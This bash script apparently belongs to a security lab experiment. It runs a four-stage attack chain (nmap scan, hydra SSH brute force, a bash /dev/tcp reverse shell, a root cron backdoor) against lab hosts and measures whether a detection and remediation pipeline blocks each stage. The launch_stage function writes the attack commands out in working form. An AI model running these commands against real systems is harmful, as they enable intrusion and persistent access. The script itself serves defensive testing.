#!/bin/bash
# Four-stage kill chain in one run (scan -> brute force -> reverse shell -> cron),
# showing the pipeline remediates each stage. The attacker block is cleared between
# the two network stages so credential access can still connect. Arg: one stage only.
set -uo pipefail

source "$(dirname "${BASH_SOURCE[0]}")/../experiments.env"
TARGET_USER="$LAB_USER"
ALERTS="/var/ossec/logs/alerts/alerts.json"
CHAIN_RUNS=3
INTER_RUN_COOLDOWN=75   # rule 100501 ignore=60 -> wait before next run's scan
RESULTS_FILE="$(pwd)/chain_results.txt"
ALL_STAGES="port_scan ssh_brute_force reverse_shell cron_persistence"
CTRL="$SSH_CONTROLLER"; ATK="$SSH_ATTACKER"; WEB="$SSH_WEBSERVER"; WS="$SSH_WORKSTATION"

mitre_for(){ case "$1" in port_scan)echo T1046;; ssh_brute_force)echo T1110.001;;
  reverse_shell)echo T1059.004;; cron_persistence)echo T1053.003;; esac; }
ids_for(){ case "$1" in port_scan)echo 100501;; ssh_brute_force)echo 5712,5758;;
  reverse_shell)echo 100520;; cron_persistence)echo 100510;; esac; }
playbook_for(){ case "$1" in port_scan|ssh_brute_force)echo block_ip.yml;;
  reverse_shell)echo kill_process.yml;; cron_persistence)echo remove_persistence.yml;; esac; }
wait_for(){ case "$1" in ssh_brute_force)echo 90;; *)echo 60;; esac; }

reset_block_state(){
  $CTRL "cd /opt/automated-ti-pipeline && sudo ansible endpoints -i $INVENTORY -m shell \
    -a 'iptables -D INPUT -s $ATTACKER_IP -j DROP -m comment --comment ti-pipeline 2>/dev/null; \
        iptables -D OUTPUT -d $ATTACKER_IP -j DROP -m comment --comment ti-pipeline 2>/dev/null; \
        true' -b" >/dev/null 2>&1 || true
  $CTRL "sudo python3 -c \"import json,pathlib; p=pathlib.Path('/var/log/ti-pipeline/blocked.json'); \
    d=json.loads(p.read_text()) if p.exists() else {}; d.pop('$ATTACKER_IP',None); \
    p.write_text(json.dumps(d,indent=2))\"" >/dev/null 2>&1 || true
}

get_done(){  # prints t_done_iso for first rc=0 dispatch of stage $1 after iso $2
  $CTRL "sudo python3 -c \"
import json
start='$2'; scen='$1'
with open('/var/log/ti-pipeline/integrator.log') as f:
    for line in f:
        line=line.strip()
        if not line: continue
        d=json.loads(line)
        if d.get('t','')>start and scen in str(d.get('matched','')) and d.get('outcome',{}).get('rc')==0:
            print(d['t']); break
\"" 2>/dev/null
}

get_fired_rule(){  # prints first rule.id from csv $1 seen in alerts after epoch $2
  $CTRL "sudo tail -c 2000000 $ALERTS | python3 -c \"
import sys,json
from datetime import datetime
ids=set('$1'.split(',')); start=float('$2')
for line in sys.stdin:
    line=line.strip()
    if not line: continue
    try: d=json.loads(line)
    except Exception: continue
    rid=str(d.get('rule',{}).get('id',''))
    if rid not in ids: continue
    try: ep=datetime.strptime(d.get('timestamp',''),'%Y-%m-%dT%H:%M:%S.%f%z').timestamp()
    except Exception: continue
    if ep>start: print(rid); break
\"" 2>/dev/null
}

verify_stage(){ case "$1" in   # echo yes if remediation took effect, else no
  port_scan|ssh_brute_force)
    $WEB "sudo iptables -S INPUT | grep -q '$ATTACKER_IP'" 2>/dev/null && echo yes || echo no ;;
  reverse_shell)
    $WS "sudo ss -tnp state established | grep -q ':$LISTENER_PORT'" 2>/dev/null && echo no || echo yes ;;
  cron_persistence)
    $WS "sudo test -f /etc/cron.d/backdoor" 2>/dev/null && echo no || echo yes ;;
esac; }

full_clean(){
  reset_block_state
  $ATK "sudo pkill -f nmap; pkill -f hydra" 2>/dev/null || true
  $CTRL "pkill -f 'nc -lvp $LISTENER_PORT'" 2>/dev/null || true
  $WS "sudo pkill -f 'bash -i'; sudo rm -f /etc/cron.d/backdoor" 2>/dev/null || true
}
trap 'echo; echo "[cleanup] restoring lab to clean state..."; full_clean' EXIT INT TERM

preflight(){
  local ok=1 name cmd
  for pair in "controller=$CTRL" "attacker=$ATK" "webserver=$WEB" "workstation=$WS"; do
    name="${pair%%=*}"; cmd="${pair#*=}"
    if $cmd "true" >/dev/null 2>&1; then echo "  [ok] $name reachable"
    else echo "  [FAIL] $name unreachable over SSH"; ok=0; fi
  done
  if $CTRL "grep -q '$ATTACKER_IP' /opt/automated-ti-pipeline/decision/allowlist.yml" 2>/dev/null; then
    echo "  [FAIL] attacker $ATTACKER_IP is in the allowlist; network stages would be suppressed"; ok=0
  else echo "  [ok] attacker IP not in allowlist"; fi
  [ "$ok" = 1 ] || { echo "Preflight failed; aborting."; exit 1; }
}

setup_stage(){ case "$1" in   # preconditions before launch
  port_scan) reset_block_state; $ATK "sudo pkill -f nmap" 2>/dev/null || true; sleep 2 ;;
  ssh_brute_force) reset_block_state; $ATK "pkill -f hydra" 2>/dev/null || true
    $ATK "seq 1 25 | sed 's/^/wrongpass/' > /tmp/bf_wordlist.txt" 2>/dev/null || true; sleep 2 ;;
  reverse_shell) $CTRL "pkill -f 'nc -lvp $LISTENER_PORT'" 2>/dev/null || true
    $WS "sudo pkill -f 'bash -i'" 2>/dev/null || true; sleep 2
    $CTRL "timeout 50 nc -lvp $LISTENER_PORT >/dev/null 2>&1 &" 2>/dev/null; sleep 1 ;;
  cron_persistence) $WS "sudo rm -f /etc/cron.d/backdoor" 2>/dev/null || true; sleep 2 ;;
esac; }

launch_stage(){ case "$1" in
  port_scan) $ATK "sudo nohup nmap -sS -p 1-1000 -T4 $WEBSERVER_IP >/dev/null 2>&1 &" 2>/dev/null ;;
  ssh_brute_force) $ATK "nohup hydra -l $TARGET_USER -P /tmp/bf_wordlist.txt -t 4 ssh://$WEBSERVER_IP >/dev/null 2>&1 &" 2>/dev/null ;;
  reverse_shell) $WS "sudo bash -c 'nohup bash -i >& /dev/tcp/$LISTENER_IP/$LISTENER_PORT 0>&1 &'" 2>/dev/null ;;
  cron_persistence) $WS "echo '* * * * * root /tmp/backdoor.sh' | sudo tee /etc/cron.d/backdoor >/dev/null" 2>/dev/null ;;
esac; }

teardown_stage(){ case "$1" in   # best-effort cleanup after a stage
  port_scan) $ATK "sudo pkill -f nmap" 2>/dev/null || true; reset_block_state ;;
  ssh_brute_force) $ATK "pkill -f hydra" 2>/dev/null || true; reset_block_state ;;
  reverse_shell) $CTRL "pkill -f 'nc -lvp $LISTENER_PORT'" 2>/dev/null || true
    $WS "sudo pkill -f 'bash -i'" 2>/dev/null || true ;;
  cron_persistence) $WS "sudo rm -f /etc/cron.d/backdoor" 2>/dev/null || true ;;
esac; }

run_stage(){
  local run="$1" stage="$2" wmax; wmax="$(wait_for "$stage")"
  echo "----- run $run: $stage (timeout ${wmax}s) -----"
  setup_stage "$stage"
  local t_start t_start_iso
  t_start=$(python3 -c "import time;print(time.time())")
  t_start_iso=$(python3 -c "from datetime import datetime;print(datetime.now().isoformat())")
  launch_stage "$stage"

  local t_done="" elapsed=0
  while [ "$elapsed" -lt "$wmax" ]; do
    t_done="$(get_done "$stage" "$t_start_iso")"
    [ -n "$t_done" ] && break
    sleep 2; elapsed=$((elapsed+2))
  done
  echo ""

  local rule status verified rt
  rule="$(ids_for "$stage")"
  if [ -z "$t_done" ]; then
    status="TIMEOUT"; verified="no"; rt="NA"
    echo "  !! TIMEOUT: no rc=0 dispatch in ${wmax}s"
  else
    rt=$(python3 -c "from datetime import datetime;print(round(datetime.fromisoformat('$t_done').timestamp()-$t_start,3))")
    local fired; fired="$(get_fired_rule "$rule" "$t_start")"; [ -n "$fired" ] && rule="$fired"
    verified="$(verify_stage "$stage")"
    if [ "$verified" = "yes" ]; then status="OK"; else status="FAIL"; echo "  !! remediation NOT verified"; fi
    echo "  response_time=${rt}s rule=$rule playbook=$(playbook_for "$stage") verified=$verified status=$status"
  fi

  printf '%s %s %s %s %s %s %s %s\n' "$run" "$stage" "$(mitre_for "$stage")" \
    "$rule" "$(playbook_for "$stage")" "$rt" "$verified" "$status" >> "$RESULTS_FILE"
  teardown_stage "$stage"
}

# ===================== MAIN =====================
ARG="${1:-}"
if [ -n "$ARG" ]; then
  case " $ALL_STAGES " in
    *" $ARG "*) STAGES="$ARG"; RUNS=1 ;;
    *) echo "Unknown stage '$ARG'. Valid: $ALL_STAGES or no arg for full chain."; exit 1 ;;
  esac
else STAGES="$ALL_STAGES"; RUNS="$CHAIN_RUNS"; fi

echo "=== preflight ==="; preflight
echo "=== clean slate ==="; full_clean; sleep 2
> "$RESULTS_FILE"

for run in $(seq 1 "$RUNS"); do
  echo "=================== CHAIN RUN $run / $RUNS ==================="
  for stage in $STAGES; do run_stage "$run" "$stage"; done
  if [ "$run" -lt "$RUNS" ]; then
    echo "  inter-run cooldown ${INTER_RUN_COOLDOWN}s (rule 100501 ignore=60)"
    sleep "$INTER_RUN_COOLDOWN"
  fi
done

echo ""; echo "=================== SUMMARY ==================="
python3 - "$RESULTS_FILE" "$RUNS" <<'PY'
import sys, statistics, collections
rows=[l.split() for l in open(sys.argv[1]) if l.strip()]
runs=int(sys.argv[2])
order=["port_scan","ssh_brute_force","reverse_shell","cron_persistence"]
by=collections.defaultdict(list)
for r in rows:
    if len(r)>=8: by[r[1]].append(r)
print(f"{'stage':18s} {'success':>9s} {'mean_s':>8s} {'verified':>9s}")
for st in order:
    rs=by.get(st,[])
    if not rs: continue
    ok=[x for x in rs if x[7]=='OK']
    ver=sum(1 for x in rs if x[6]=='yes')
    times=[float(x[5]) for x in ok if x[5] not in ('NA','')]
    mean=f"{statistics.mean(times):.2f}" if times else "NA"
    print(f"{st:18s} {len(ok):>4d}/{len(rs):<4d} {mean:>8s} {ver:>4d}/{len(rs):<4d}")
byrun=collections.defaultdict(dict)
for r in rows:
    if len(r)>=8: byrun[r[0]][r[1]]=r[7]
full=sum(1 for st in byrun.values() if len(st)==len(order) and all(v=='OK' for v in st.values()))
print()
print(f"Chain completed {full}/{runs} times with all four stages detected and remediated.")
PY
echo ""
echo "Per-(run,stage) rows saved to: $RESULTS_FILE"
